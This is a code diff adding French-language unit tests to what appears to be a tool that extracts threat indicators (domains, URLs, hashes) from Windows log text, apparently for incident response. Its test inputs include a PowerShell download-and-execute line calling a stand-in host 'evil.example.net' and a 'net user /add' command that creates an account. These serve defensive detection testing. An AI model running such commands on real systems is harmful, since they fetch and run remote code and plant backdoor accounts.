@@ -90,6 +90,36 @@ class TestIOC(unittest.TestCase):
         self.assertEqual(
             [t for t, _ in extraire_motifs("powershell.exe -nop C:\\Temp\\p.exe")], [])
 
+    def test_domaines_tld_connus(self):
+        faux = ["IEX (New-Object Net.WebClient).DownloadString('http://evil.example.net/p.exe')",
+                "[System.Text.Encoding]::UTF8", "net user a.durand P@ss /add",
+                "j.martin", "a.durand", "p.exe"]
+        for texte in faux:
+            doms = {v for t, v in extraire_motifs(texte) if t == "domain"}
+            self.assertNotIn("net.webclient", doms)
+            self.assertNotIn("system.text.encoding", doms)
+            self.assertFalse(doms & {"a.durand", "j.martin", "p.exe"}, texte)
+        p = set(extraire_motifs(faux[0]))
+        self.assertIn(("url", "http://evil.example.net/p.exe"), p)
+        self.assertIn(("domain", "evil.example.net"), p)
+        self.assertEqual({v for t, v in p if t == "domain"}, {"evil.example.net"})
+        self.assertEqual(extraire_motifs("j.martin"), [])
+        self.assertIn(("domain", "evil.example.net"), extraire_motifs("evil.example.net"))
+        # hôte d'URL conservé même avec un TLD hors liste
+        self.assertIn(("domain", "c2.exemple.zzz"), extraire_motifs("http://c2.exemple.zzz/x"))
+
+    def test_extraction_champ_destination(self):
+        from types import SimpleNamespace as N
+        evt = N(timestamp=DEPUIS, event_id=4688, host="H1", account="u",
+                details={"destination": "evil.example.net", "task_name": "x.example.com",
+                         "member": "a.b.com"})
+        q = N(evt=evt, nature="processus_benin", commande_decodee=None)
+        ch = N(evenements=[q], comptes_suivis=["u"])
+        piv = N(compromissions=[])
+        r = extraire_iocs(N(suspectes=[]), piv, [ch])
+        self.assertEqual([(i.type_misp, i.valeur) for i in r], [("domain", "evil.example.net")])
+        self.assertIn("champ destination", r[0].commentaire)
+
     def test_motifs(self):
         texte = ("curl http://a.example.org:8080/x?y=1 et 10.1.2.3 "
                  "md5 d41d8cd98f00b204e9800998ecf8427e sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 "
